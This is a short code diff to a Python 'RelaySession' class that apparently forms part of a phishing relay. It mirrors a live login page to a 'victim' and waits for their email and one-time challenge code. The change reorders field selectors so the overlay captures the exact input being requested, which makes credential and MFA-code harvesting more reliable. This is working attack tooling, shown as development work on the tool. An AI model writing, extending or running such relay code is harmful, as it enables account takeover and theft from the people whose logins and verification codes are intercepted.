@@ -558,7 +558,11 @@ class RelaySession(threading.Thread):
                 return
             ibox = None
             kind = self.input_kind
-            for sel, k in (self.input_sels or self.INPUT_SELS):
+            sels = list(self.input_sels or self.INPUT_SELS)
+            want = getattr(self, "_want_kind", None)
+            if want:
+                sels.sort(key=lambda sk: 0 if sk[1] == want else 1)
+            for sel, k in sels:
                 loc = pg.locator(sel).first
                 try:
                     if loc.is_visible():
@@ -759,6 +763,7 @@ class RelaySession(threading.Thread):
         """Wait for the victim's input while keeping the mirror streaming."""
         self.state = {"code": "challenge", "email": "init_email"}.get(kind, kind)
         self.need_input = kind
+        self._want_kind = kind  # the overlay must mirror THIS field
         self.hint = hint
         remaining = max(1.0, self.deadline - time.time())
         rounds = int(remaining / 1.2) + 1
